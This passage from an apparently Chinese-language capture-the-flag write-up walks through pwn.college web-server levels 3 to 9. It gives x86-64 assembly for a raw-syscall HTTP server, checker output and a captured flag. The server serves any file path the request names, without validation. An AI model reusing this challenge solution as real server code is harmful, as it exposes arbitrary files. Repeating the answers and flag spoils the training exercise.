class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">// internet address          （4字节）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>  sin_zero[<span class="number">8</span>]; <span class="comment">// padding to match sizeof(struct sockaddr)  （8字节）</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">// 由上述结构体可知 addrlen 默认为 16</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>这题使用的是 <code>sockaddr_in</code>，<code>sockaddr_in</code> 是
<code>sockaddr</code> 结构的一个具体版本，专门用于 IPv4
地址族。这里使用栈来存放结构体的参数，<strong>注意字节顺序</strong>，然后返回<code>rsp</code>作为指针</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0  # 填充字节</span><br><span class="line">    push 0x0000000050000002  # 实际内存中的顺序为：0200（2） 0050（80） 00000000（0.0.0.0）</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp   # 传入结构体指针</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：<code>int listen(int sockfd, int backlog)</code>
利用listen监听socket（backlog参数表示队列大小）</p>
<p>listen详解参考：https://xiaoxiami.gitbook.io/linux-server/socket/socket-xiang-guan-han-shu/shi-yong-listen-he-accept-han-shu</p>
<p>wp：通过运行<code>/challenge/run ./server</code>得到<code>listen(3, 0) = 0</code>，两个参数即可，第一个参数就是socket对应的整数值<code>socketfd</code>，正好level3中的<code>bind</code>操作将<code>socketfd</code>传给了<code>rdi</code>，因此可以省略这一步，直接设置第二个参数即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0  # 这里没有设置rdi，因为该参数与上一个rdi相同</span><br><span class="line">    mov rax, 50 # listen</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：接受连接。</p>
<p>wp：根据提示<code>accept(3, NULL, NULL)</code>，将后两个参数设置为0。将后两个参数设为null，服务器接受客户端连接时不会存储客户端的地址信息</p>
<blockquote>
<p><code>bind</code> 函数中的 <code>&amp;address</code>
用于指定服务器的地址信息（IP 和端口），以绑定套接字。</p>
<p><code>accept</code> 函数中的 <code>&amp;address</code>
用于接收客户端的地址信息（IP
和端口），以识别哪个客户端连接到了服务器。</p>
</blockquote>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：静态响应HTTP请求</p>
<p>wp：根据下面的提示完善程序</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">[ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">[ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>这里主要涉及到汇编代码的编写，其中注意 <code>lea</code>
的用法，可获取变量的地址。这里 <code>read</code>
的作用是尝试从某个文件描述符（由 <code>accept</code>
系统调用返回的套接字描述符
<code>rax</code>）读取数据，并将读取的数据存储到 <code>array</code>
缓冲区中。通常情况下，这个操作用于读取客户端通过网络发送给服务器的数据。下面只展示重要的代码：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 accept 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">server.s                                                        </span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：动态响应HTTP请求，要求如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">  [ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">  [ ] open(<span class="string">"&lt;open_path&gt;"</span>, O_RDONLY) = <span class="number">5</span></span><br><span class="line">  [ ] read(<span class="number">5</span>, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">5</span>) = <span class="number">0</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：<code>open</code>函数需要文件名，这里应该是从客户端发送的数据中获取，包含在<code>read</code>读到缓冲区的内容中，下面是<code>int open(const char *filename, int flag)</code>中<code>flag</code>的具体整数值</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDONLY	00000000  <span class="comment">// 注意这里是8进制</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_WRONLY	00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDWR		00000002</span></span><br></pre></td></tr></tbody></table></figure>
<p>这题的难点在于如何获取文件路径，根据GET请求得知，文件路径从第四个字节开始，且该题的文件路径长度为16。下面是完整代码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度，read的返回值就是文件内容大小</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length: # 用于存放数据长度</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure>
<p>运行上述代码得到flag，并得到相关回显：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br><span class="line">[✓] listen(3, 0)                            = 0</span><br><span class="line">[✓] accept(3, NULL, NULL)                   = 4</span><br><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY)      = 5</span><br><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br><span class="line">[✓] close(5)                                = 0</span><br><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br><span class="line">[✓] close(4)                                = 0</span><br><span class="line">[✓] exit(0)           </span><br></pre></td></tr></tbody></table></figure>
<p>下面是对这个流程的详细解释：</p>
<ol type="1">
<li><strong>创建套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>创建一个用于 IPv4（AF_INET）和
TCP（SOCK_STREAM）的套接字。<code>socket()</code> 返回的文件描述符为
<code>3</code>。</li>
</ul></li>
<li><strong>绑定套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>将套接字绑定到本地地址 <code>0.0.0.0</code> 和端口
<code>80</code>，使其能够接收来自任何 IP 地址的连接。</li>
</ul></li>
<li><strong>监听连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] listen(3, 0) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>使套接字开始监听传入的连接。这里的 <code>backlog</code> 参数为
<code>0</code>，可能意味着默认的待处理连接队列长度。</li>
</ul></li>
<li><strong>接受连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] accept(3, NULL, NULL) = 4</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>接受一个传入的连接。新的套接字文件描述符为
<code>4</code>，用于与客户端进行通信。</li>
</ul></li>
<li><strong>读取客户端请求</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>从客户端套接字 <code>4</code> 读取 HTTP 请求，读取的请求长度为
<code>161</code> 字节。</li>
</ul></li>
<li><strong>打开请求的文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY) = 5</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>根据客户端的请求路径
<code>/tmp/tmpis83a2pt</code>，打开对应的文件，文件描述符为
<code>5</code>。</li>
</ul></li>
<li><strong>读取文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>从文件描述符 <code>5</code> 中读取 <code>144</code>
字节的数据。</li>
</ul></li>
<li><strong>关闭文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(5) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>关闭文件描述符 <code>5</code>。</li>
</ul></li>
<li><strong>发送响应头</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>向客户端发送 HTTP 响应头，表明请求成功（200 OK），总共发送了
<code>19</code> 字节。</li>
</ul></li>
<li><strong>发送文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>将读取到的 <code>144</code> 字节的文件内容写入客户端套接字
<code>4</code>。</li>
</ul></li>
<li><strong>关闭客户端连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(4) = 0</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>关闭客户端套接字 <code>4</code>。</li>
</ul></li>
<li><strong>退出程序</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] exit(0)</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>退出服务器程序，状态码为 <code>0</code> 表示正常退出。</li>
</ul></li>
</ol></li>
<li><p>level8：动态响应多个HTTP请求</p>
<p>wp：没什么头绪，以为要使用<code>fork</code>函数，但是参考网上的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，直接在<code>exit</code>前再加个<code>accept</code>函数即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：多个程序动态响应多个HTTP请求（GET）。题目要求分为父进程和子进程</p>
